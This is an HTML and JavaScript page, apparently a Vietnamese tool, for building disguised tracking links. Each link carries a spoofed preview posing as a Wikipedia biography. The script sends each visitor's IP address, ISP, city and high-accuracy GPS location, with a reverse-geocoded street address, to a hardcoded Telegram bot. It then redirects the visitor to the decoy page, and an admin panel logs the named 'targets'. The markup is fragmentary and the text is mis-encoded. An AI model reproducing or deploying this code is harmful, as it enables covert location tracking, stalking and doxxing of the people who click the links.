<body id="main-body" class="victim-body">

            <header class="flex justify-between items-center border-b border-gray-800 pb-6">

                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase shadow-lg">L∆∞u & T·∫°o Link</button>
                        
                        <div id="box-result" class="hidden p-4 bg-black rounded-xl border border-blue-900/30">

                </div>

                <div class="lg:col-span-7">
                    <div class="glass min-h-[600px] flex flex-col overflow-hidden shadow-2xl">
                        <div class="p-5 border-b border-gray-800 flex justify-between items-center bg-black/20">
                            <h3 class="text-[10px] font-black text-white uppercase tracking-widest italic">Nh·∫≠t k√Ω truy c·∫≠p tr·ª±c ti·∫øp</h3>
                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 uppercase font-bold">X√≥a l·ªãch s·ª≠</button>
                        </div>
                        <div class="overflow-x-auto flex-1">

                                    <tr>
                                        <th class="p-5">ƒê·ªëi t∆∞·ª£ng</th>

    </div>

    <script>
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n",
            mt: "Ti·ªÉu s·ª≠ ƒê·ª©c qu·ªëc c√¥ng ƒê√†o Minh Qu√¢n",
            md: "T·ªôi √°c c·ªông s·∫£n v·ªõi ƒê√†o Minh Qu√¢n v√† c√¥ng ∆°n cao c·∫£ c·ªßa Ng√†i.",
            mi: "https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v24_auth') === 'true' || prompt("Access Key:") === "123") {
                    localStorage.setItem('v24_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startTracking(); }
        };

        // --- CORE TRACKING ---
        async function startTracking() {
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(atob(v)); 
                // C·∫≠p nh·∫≠t th·∫ª Meta c·ªßa trang th·ª±c t·∫ø
                document.title = config.mt;
                document.getElementById('meta-desc').content = config.md;
                document.getElementById('og-title').content = config.mt;
                document.getElementById('og-desc').content = config.md;
                document.getElementById('og-img').content = config.mi;
            } catch(e) {}

            const target = urlParams.get('name') || 'Guest';
            let ipInfo = { ip: 'N/A', org: 'N/A', city: 'N/A', lat: 0, lon: 0 };

            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                ipInfo = { ip: res.ip, org: res.org, city: res.city, lat: res.latitude, lon: res.longitude };
                addLog({ name: target, ...ipInfo, address: res.city + ", " + res.country_name, time: new Date().toLocaleTimeString(), st: 'IP' });
                await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + target + "</b> truy c·∫≠p\nüåê IP: " + ipInfo.ip + "\nüè¢ ISP: " + ipInfo.org + "\nüìç V√πng: " + ipInfo.city)}`);
            } catch(e) {}

            const jump = () => window.location.replace(config.r);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let fullAddr = "T·ªça ƒë·ªô: " + lat + ", " + lon;
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        fullAddr = geo.display_name || fullAddr;
                    } catch(e) {}
                    updateLog(target, lat, lon, fullAddr);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + target + "</b> GPS OK\nüìç " + fullAddr + "\nüó∫Ô∏è Map: https://www.google.com/maps?q=$" + lat + "," + lon)}`);
                    jump();
                }, jump, { enableHighAccuracy: true, timeout: 5000 });
            } else { jump(); }
            setTimeout(jump, 8000);
        }

        // --- ADMIN DASHBOARD ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            
            const saved = localStorage.getItem('v24_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('ed-title').value = config.mt;
            document.getElementById('ed-desc').value = config.md;
            document.getElementById('ed-img').value = config.mi;
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            liveUpdateMeta();
            renderLogs();
            setInterval(renderLogs, 3000); // T·ª± ƒë·ªông load nh·∫≠t k√Ω m·ªói 3 gi√¢y
        }

        function liveUpdateMeta() {
            const t = document.getElementById('ed-title').value;
            const d = document.getElementById('ed-desc').value;
            const i = document.getElementById('ed-img').value;
            
            // C·∫≠p nh·∫≠t Preview UI
            document.getElementById('pre-title').innerText = t;
            document.getElementById('pre-desc').innerText = d;
            document.getElementById('pre-img').src = i;

            // C·∫≠p nh·∫≠t Meta th·∫≠t c·ªßa trang
            document.title = t;
            document.getElementById('meta-desc').content = d;
            document.getElementById('og-title').content = t;
            document.getElementById('og-desc').content = d;
            document.getElementById('og-img').content = i;
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            config.mt = document.getElementById('ed-title').value;
            config.md = document.getElementById('ed-desc').value;
            config.mi = document.getElementById('ed-img').value;
            
            localStorage.setItem('v24_cfg', JSON.stringify(config));
            
            const name = document.getElementById('in-target').value || 'Target';
            const base = window.location.href.split('?')[0];
            const link = `${base}?name=${encodeURIComponent(name)}&v=${btoa(unescape(encodeURIComponent(JSON.stringify(config))))}`;
            
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = link;
            alert("ƒê√£ l∆∞u v√† ƒë√≥ng g√≥i Link!");
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v24_logs') || '[]');
            const table = document.getElementById('log-list');
            table.innerHTML = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-5"><span class="text-white font-black uppercase text-[12px]">${l.name}</span><br><span class="text-[9px] text-gray-600">${l.time}</span></td>
                    <td class="p-5 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-500">${l.isp}</span></td>
                    <td class="p-5 text-gray-400 text-[10px] leading-relaxed max-w-xs">${l.address || l.city}</td>
                    <td class="p-5 text-right">
                        ${l.st === 'GPS' ? `<a href="https://www.google.com/maps?q=$$${l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 px-3 py-1 rounded-lg text-[9px] font-bold">MAP</a>` : `<span class="text-gray-700 italic text-[9px]">IP ONLY</span>`}
                    </td>
                </tr>
            `).join('');
        }

        function addLog(data) {
            let logs = JSON.parse(localStorage.getItem('v24_logs') || '[]');
            logs.unshift(data);
            localStorage.setItem('v24_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function updateLog(name, lat, lon, addr) {
            let logs = JSON.parse(localStorage.getItem('v24_logs') || '[]');
            if(logs.length > 0 && logs[0].name === name) {
                logs[0].st = 'GPS'; logs[0].lat = lat; logs[0].lon = lon; logs[0].address = addr;
            }
            localStorage.setItem('v24_logs', JSON.stringify(logs));
        }

        function clearLogs() { localStorage.removeItem('v24_logs'); renderLogs(); }
        function logout() { localStorage.removeItem('v24_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy!"); }
    </script>
